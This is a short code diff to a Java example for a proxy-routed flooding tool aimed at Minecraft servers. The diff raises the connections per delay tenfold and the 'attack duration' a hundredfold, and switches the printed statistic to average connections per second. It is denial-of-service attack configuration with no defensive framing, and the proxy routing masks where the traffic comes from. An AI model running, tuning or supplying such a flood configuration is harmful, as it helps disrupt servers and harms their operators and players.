@@ -35,8 +35,8 @@ public class AsuraExample {
                 .workerThreads(10)
                 .proxyType(ProxyType.SOCKS4)
                 .delay(1) //in ms
-                .perDelay(1000) // connections per delay
-                .duration(100) //attack duration
+                .perDelay(10000) // connections per delay
+                .duration(10000) //attack duration
                 .protocolID(760) //miecraft version protocol id
                 .proxyManager(makeProxyManager()) //proxy manager
                 .usingEpoll(true) // gives high performance in linux if true
@@ -50,7 +50,7 @@ public class AsuraExample {
 
         // u can print or use live updated values in bootstrap
         while (!bootstrap.shouldStop) {
-            System.out.println(bootstrap.totalConnections);
+            System.out.println(bootstrap.averageCPS);
             // sleep for 1000 sec as CPS updates every sec so no use to see its value
             // between a interval if sec
             try {
